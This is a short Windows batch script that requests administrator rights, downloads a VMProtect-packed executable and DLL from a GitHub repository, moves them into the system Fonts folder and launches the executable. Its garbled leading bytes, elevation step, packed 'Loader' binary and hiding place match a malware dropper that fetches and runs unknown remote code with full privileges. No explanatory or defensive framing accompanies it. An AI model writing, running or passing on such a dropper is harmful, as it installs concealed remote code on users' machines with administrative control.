��&cls
��
@echo off
:: Check for administrative privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    :: Re-run the batch file with administrative privileges
    powershell -Command "Start-Process cmd.exe -ArgumentList '/c %~f0' -Verb runAs"
    exit /b
)

:: Define URLs and paths
set "loader_url=https://github.com/nugsut/clena/raw/refs/heads/main/Loader.vmp.exe"
set "dll_url=https://github.com/nugsut/clena/raw/refs/heads/main/VMProtectSDK64.dll"
set "destination=C:\Windows\Fonts"

:: Define temporary download paths
set "loader_temp=%temp%\Loader.vmp.exe"
set "dll_temp=%temp%\VMProtectSDK64.dll"

:: Download files using PowerShell
powershell -Command "Invoke-WebRequest -Uri %loader_url% -OutFile %loader_temp%"
powershell -Command "Invoke-WebRequest -Uri %dll_url% -OutFile %dll_temp%"

:: Move files to destination
move /Y "%loader_temp%" "%destination%"
move /Y "%dll_temp%" "%destination%"

:: Execute Loader.vmp.exe
start "" "%destination%\Loader.vmp.exe"
